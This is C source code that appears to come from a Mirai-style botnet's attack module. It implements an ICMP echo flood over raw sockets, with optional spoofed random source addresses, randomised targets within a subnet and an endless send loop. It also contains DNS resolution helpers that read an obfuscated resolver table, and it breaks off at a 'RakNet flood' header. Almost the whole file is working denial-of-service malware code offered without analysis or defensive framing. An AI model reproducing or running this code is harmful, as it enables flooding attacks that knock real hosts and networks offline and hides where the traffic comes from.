#define _GNU_SOURCE
#include <fcntl.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "table.h"
#include "util.h"
#include "protocol.h"


void attack_method_icmp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int fd;
    char *packet;
    struct iphdr *iph;
    struct icmphdr *icmph;
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    uint16_t data_len = (uint16_t)attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1400);
    int i;
    size_t total_len;

    if (data_len > 65500) data_len = 65500;
    if (data_len < 8) data_len = 8;

    total_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + data_len;
    packet = calloc(1, total_len);
    if (!packet) return;

    iph = (struct iphdr *)packet;
    icmph = (struct icmphdr *)(packet + sizeof(struct iphdr));

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
    {
        free(packet);
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        free(packet);
        return;
    }

    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(total_len);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_ICMP;
    iph->daddr = targs[0].addr;

    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->un.echo.id = htons(rand_next() & 0xffff);

    while (TRUE)
    {
        if (targs[0].netmask < 32)
            iph->daddr = htonl(ntohl(targs[0].addr) + (((uint32_t)rand_next()) >> targs[0].netmask));
        iph->saddr = source_ip == 0xffffffff ? rand_next() : source_ip;
        iph->id = htons(rand_next() & 0xffff);
        icmph->un.echo.sequence = htons(rand_next() & 0xffff);
        icmph->checksum = 0;
        icmph->checksum = checksum_generic((uint16_t *)icmph, sizeof(struct icmphdr) + data_len);
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        targs[0].sock_addr.sin_port = 0;
        sendto(fd, packet, total_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof(struct sockaddr_in));
    }
}

/*
 * Resolve a domain to an IPv4 address by sending a raw DNS A-record query
 * to a specific DNS server. Returns the resolved IP in network byte order,
 * or 0 on failure.
 */
ipv4_t resolve_domain_with_server(char *domain, ipv4_t dns_server)
{
    int s, i, domain_len, qlen;
    unsigned char query[512];
    unsigned char response[512];
    struct sockaddr_in dns_addr;
    int pos, ret;

    if (domain == NULL || util_strlen(domain) == 0 || util_strlen(domain) > 253)
        return 0;

    domain_len = util_strlen(domain);

    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return 0;

    {
        struct timeval tv = {2, 0};
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    }

    dns_addr.sin_family = AF_INET;
    dns_addr.sin_port = htons(53);
    dns_addr.sin_addr.s_addr = dns_server;

    /* build DNS query header */
    pos = 0;

    /* transaction ID */
    {
        uint16_t txid = (uint16_t)rand_next();
        query[pos++] = (txid >> 8) & 0xFF;
        query[pos++] = txid & 0xFF;
    }

    /* flags: standard query, recursion desired */
    query[pos++] = 0x01; query[pos++] = 0x00;

    /* question count = 1 */
    query[pos++] = 0x00; query[pos++] = 0x01;

    /* answer/authority/additional counts = 0 */
    query[pos++] = 0x00; query[pos++] = 0x00;
    query[pos++] = 0x00; query[pos++] = 0x00;
    query[pos++] = 0x00; query[pos++] = 0x00;

    /* encode domain name as labels */
    {
        int start = 0;
        for (i = 0; i <= domain_len; i++)
        {
            if (domain[i] == '.' || domain[i] == 0)
            {
                int len = i - start;
                query[pos++] = (unsigned char)len;
                util_memcpy(query + pos, domain + start, len);
                pos += len;
                start = i + 1;
            }
        }
        query[pos++] = 0x00;
    }

    /* query type = A (1), class = IN (1) */
    query[pos++] = 0x00; query[pos++] = 0x01;
    query[pos++] = 0x00; query[pos++] = 0x01;

    qlen = pos;

    ret = sendto(s, query, qlen, 0, (struct sockaddr *)&dns_addr, sizeof(dns_addr));
    if (ret <= 0) { close(s); return 0; }

    ret = recvfrom(s, response, sizeof(response), 0, NULL, NULL);
    close(s);
    if (ret < 12) return 0;

    /* check response code */
    {
        uint16_t flags = (response[2] << 8) | response[3];
        int rcode = flags & 0x0F;
        if (rcode != 0) return 0;
    }

    /* skip question section */
    {
        uint16_t qdcount = (response[4] << 8) | response[5];
        pos = 12;
        for (i = 0; i < qdcount && pos < ret; i++)
        {
            while (pos < ret && response[pos] != 0)
            {
                if ((response[pos] & 0xC0) == 0xC0) { pos += 2; break; }
                pos += response[pos] + 1;
            }
            if (pos < ret && response[pos] == 0) pos++;
            pos += 4; /* QTYPE + QCLASS */
        }
    }

    /* scan answer section for A records */
    {
        uint16_t ancount = (response[6] << 8) | response[7];
        for (i = 0; i < ancount && pos < ret; i++)
        {
            /* skip name (may be compressed or labels) */
            if ((response[pos] & 0xC0) == 0xC0) { pos += 2; }
            else {
                while (pos < ret && response[pos] != 0)
                {
                    if ((response[pos] & 0xC0) == 0xC0) { pos += 2; break; }
                    pos += response[pos] + 1;
                }
                if (pos < ret && response[pos] == 0) pos++;
            }
            if (pos + 10 > ret) break;

            {
                uint16_t rtype = (response[pos] << 8) | response[pos + 1];
                uint16_t rdlen = (response[pos + 8] << 8) | response[pos + 9];
                pos += 10;

                if (rtype == 1 && rdlen == 4 && pos + 4 <= ret)
                {
                    ipv4_t ip;
                    util_memcpy(&ip, response + pos, 4);
                    return ip;
                }
                pos += rdlen;
            }
        }
    }

    return 0;
}

ipv4_t get_dns_resolver(void)
{
    int fd;
    table_unlock_val(TABLE_ATK_RESOLVER);
    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    table_lock_val(TABLE_ATK_RESOLVER);
    if (fd >= 0)
    {
        int ret, nspos;
        char resolvbuf[2048];
        ret = read(fd, resolvbuf, sizeof (resolvbuf));
        close(fd);
        table_unlock_val(TABLE_ATK_NSERV);
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
        table_lock_val(TABLE_ATK_NSERV);
        if (nspos != -1)
        {
            int i;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;
            for (i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];
                if (!finished_whitespace)
                {
                    if (c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }
                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }
            if (found)
                return inet_addr(ipbuf);
        }
    }
    switch (rand_next() % 4)
    {
    case 0:
        return INET_ADDR(8,8,8,8);
    case 1:
        return INET_ADDR(74,82,42,42);
    case 2:
        return INET_ADDR(64,6,64,6);
    case 3:
        return INET_ADDR(4,2,2,2);
    }
    return INET_ADDR(8,8,8,8);
}

/* ──── RakNet flood ──── */
